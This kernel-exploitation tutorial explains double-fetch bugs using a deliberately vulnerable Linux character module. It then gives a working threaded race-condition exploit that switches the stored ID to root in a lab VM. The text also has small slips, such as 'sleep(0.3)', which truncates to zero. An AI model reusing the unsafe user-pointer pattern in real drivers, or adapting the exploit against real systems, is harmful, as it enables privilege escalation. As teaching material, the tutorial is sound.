---
description: The most simple of vulnerabilities
---

# Double-Fetch

A **double-fetch** vulnerability is when data is accessed from userspace multiple times. Because userspace programs will commonly pass parameters in to the kernel as **pointers**, the data can be modified at any time. If it is modified at the exact right time, an attacker could compromise the execution of the kernel.

## A Vulnerable Kernel Module

Let's start with a convoluted example, where all we want to do is change the `id` that the module stores. We are not allowed to set it to `0`, as that is the ID of `root`, but all other values are allowed.

The code below will be the contents of the `read()` function of a kernel. I've removed [the boilerplate code mentioned previously](writing-a-char-module/a-communicatable-char-driver.md), but here are the relevant parts:

```c
#define PASSWORD    "p4ssw0rd"

typedef struct {
    int id;
    char password[10];
} Credentials;

static int id = 1001;

static ssize_t df_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    Credentials *creds = (Credentials *)buf;

    printk(KERN_INFO "[Double-Fetch] Reading password from user...");

    if (creds->id == 0) {
        printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
        return -1;
    }

    // to increase reliability
    msleep(1000);

    if (!strcmp(creds->password, PASSWORD)) {
        id = creds->id;
        printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
        return id;
    }

    printk(KERN_ALERT "[Double-Fetch] Password incorrect!");
    return -1;
}
```

The program will:

* Check if the ID we are attempting to switch to is `0`
  * If it is, it doesn't allow us, as we attempted to log in as root
* Sleep for 1 second (this is just to illustrate the example better, we will remove it later)
* Compare the password to `p4ssw0rd`
  * If it is, it will set the `id` variable to the `id` in the `creds` structure

### Simple Communication

Let's say we want to communicate with the module, and we set up a simple C program to do so:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    int id;
    char password[10];
} Credentials;

int main() {
    int fd = open("/dev/double_fetch", O_RDWR);
    printf("FD: %d\n", fd);

    Credentials creds;
    creds.id = 900;
    strcpy(creds.password, "p4ssw0rd");

    int res_id = write(fd, &creds, 9);
    printf("New ID: %d\n", res_id);

    return 0;
}
```

We compile this statically (as there are no shared libraries on our VM):

```bash
gcc -static -o exploit exploit.c
```

As expected, the `id` variable gets set to `900` - we can check this in `dmesg`:

```
$ dmesg
[...]
[    3.104165] [Double-Fetch] Password correct! ID set to 900
```

That all works fine.

## Exploiting a Double-Fetch and Switching to ID 0

{% file src="../../.gitbook/assets/double_fetch_sleep.zip" %}

The flaw here is that `creds->id` is **dereferenced twice**. What does this mean? The kernel module is passed a **reference** to a `Credentials` struct:

```c
Credentials *creds = (Credentials *)buf;
```

This is a **pointer**, and that is perhaps the _most_ important thing to remember. When we interact with the module, we give it _a specific memory address_. This memory address holds the `Credentials` struct that we define and pass to the module. The kernel does **not** have a copy - it relies on the user's copy, and goes to userspace memory to use it.

Because this struct is controlled by the user, they have the power to _change it whenever they like_.

The kernel module uses the `id` field of the struct on two separate occasions. Firstly, to check that the ID we wish to swap to is valid (not `0`):

```c
if (creds->id == 0) {
    printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
    return -1;
}
```

And once more, to set the `id` variable:

```c
if (!strcmp(creds->password, PASSWORD)) {
    id = creds->id;
    printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
    return id;
}
```

Again, this might seem fine - but it's not. _What is stopping it from changing inbetween these two uses_? The answer is simple: nothing. That is what differentiates userspace exploitation from kernel space.

### A Proof-of-Concept: Switching to ID 0

Inbetween the two dereferences `creds->id`, there is a timeframe. Here, we have artificially extended it (by sleeping for one second). We have a **race codition** - the aim is to switch `id` in that timeframe. If we do this successfully, we will pass the initial check (as the ID will start off as `900`), but by the time it is copied to `id`, it will have become `0` and we have bypassed the security check.



Here's the plan, visually, if it helps:



<figure><img src="../../.gitbook/assets/double_fetch_id (1).svg" alt=""><figcaption></figcaption></figure>

In the waiting period, we swap out the `id`.

{% hint style="info" %}
If you are trying to compile your own kernel, this will **only** work if you have `CONFIG_SMP` enabled, because we need to modify it in a different thread! Additionaly, you need QEMU to have the flag `-smp cores=2` (or more), though it may default to having multiple even without the flag.

The C program will hang on `write` until the kernel module returns, so we can't use the main thread.
{% endhint %}

With that in mind, the "exploit" is fairly self-explanatory - we start another thread, wait 0.3 seconds, and change `id`!

{% code overflow="wrap" lineNumbers="true" %}
```c
// gcc -static -o exploit -pthread exploit.c

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void *switcher(void *arg);

typedef struct {
    int id;
    char password[10];
} Credentials;

int main() {
    // communicate with the module
    int fd = open("/dev/double_fetch", O_RDWR);
    printf("FD: %d\n", fd);

    // use a random ID and set the password correctly
    Credentials creds;
    creds.id = 900;
    strcpy(creds.password, "p4ssw0rd");

    // set up the switcher thread
    // pass it a pointer to `creds`, so it can modify it
    pthread_t thread;

    if (pthread_create(&thread, NULL, switcher, &creds)) {
        fprintf(stderr, "Error creating thread\n");
        return -1;
    }

    // now we write the cred struct to the module
    // it should be swapped after about .3 seconds by switcher
    int res_id = write(fd, &creds, 9);

    // write returns the id we switched to
    // if all goes well, that is 0
    printf("New ID: %d\n", res_id);

    // finish thread cleanly
    if (pthread_join(thread, NULL)) {
        fprintf(stderr, "Error joining thread\n");
        return -1;
    }

    return 0;
}

void *switcher(void *arg) {
    Credentials *creds = (Credentials *)arg;

    // wait until the module is sleeping - don't want to change it BEFORE the initial ID check!
    sleep(0.3);

    creds->id = 0;
}
```
{% endcode %}

We have to compile it statically, as the VM has no shared libraries.

```bash
$ gcc -static -o exploit -pthread exploit.c
```

Now we have to somehow get it into the file system. In order to do that, we need to first extract the `.cpio` archive (you may want to do this in another folder):

```bash
$ cpio -i -F initramfs.cpio
```

Now copy `exploit` there and make sure it's marked executable. You can then compress the filesystem again:

```bash
$ find . -not -name *.cpio | cpio -o -H newc > initramfs.cpio
```

Use the newly-created `initramfs.cpio` to lauch the VM with `run.sh`. Executing `exploit`, it is successful!

```bash
~ # ./exploit 
FD: 3
New ID: 0
```

{% hint style="info" %}
Note that the VM loaded you in as `root` by default. This is for debugging purposes, as it allows you to use utilities such as `dmesg` to read the kernel module output and check for errors, as well as a host of other things we will talk about. When testing exploits, it's always helpful to fix the `init` script to load you in as root! Just don't forget to test it as another user in the end.
{% endhint %}
